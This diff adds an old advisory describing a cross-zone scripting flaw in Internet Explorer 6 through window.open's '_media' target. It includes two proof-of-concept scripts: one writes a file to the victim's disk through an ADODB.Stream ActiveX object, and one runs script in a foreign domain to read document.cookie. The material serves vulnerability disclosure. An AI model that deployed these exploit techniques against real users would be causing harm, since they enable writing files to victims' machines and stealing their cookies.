@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/9769/info
+
+It has been reported that Microsoft Internet Explorer may be prone to a cross-zone scripting vulnerability that could ultimately lead to execution of malicious script code and Active Content in the context of the My Computer Zone or a foreign domain. Reportedly, hostile code can be executed in the context of the Media Bar via the '_media' property of the 'window.open' method. Cross-Site scripting attacks are possible as well. This functionality is only available in Internet Explorer 6 and above.
+
+This issue was originally described in BID 8577 "Multiple Microsoft Internet Explorer Script Execution Vulnerabilities". 
+
+<script>
+
+// '\\42' -> '\42' -> ' " '
+img_src='javascript:file = \\42Exploit.txt\\42; o = new ActiveXObject(\\42ADODB.Stream\\42);'
++ ' o.Open(); o.Type=2; o.Charset=\\42ascii\\42; o.WriteText(\\42My name is Cheng Peng Su.\\42);'
++ ' o.SaveToFile(file, 2); o.Close(); alert(\\42I wanna create \\42+file+\\42 on your desktop!\\42);';
+
+inject_html="<img src='" + img_src + "'>";
+
+window.open('file:javascript:document.write("' + inject_html + '")','_media');
+
+</script>
+
+Additional proof of concept for cross site scripting has been supplied as well:
+
+<script>
+
+window.open("http://www.google.com/","_media")
+setTimeout(function(){
+window.open("file:javascript:alert(document.cookie);","_media")
+},5000);
+
+</script>
